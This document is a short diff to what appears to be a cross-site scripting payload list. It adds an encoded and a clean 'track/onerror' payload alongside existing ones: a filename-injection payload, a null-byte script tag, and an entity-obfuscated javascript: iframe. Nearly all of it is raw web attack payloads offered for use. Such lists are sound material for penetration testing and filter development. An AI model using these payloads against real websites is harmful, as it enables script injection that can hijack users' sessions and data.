@@ -23,3 +23,9 @@ change the filename to \"><img src=1 onerror=\"url=String104,116,116,112,115,58,
 %00<script>alert(1)</script>
 
 <iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+
+Encoded Payload
+&#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
+
+Clean Payload
+"><track/onerror='confirm1'>
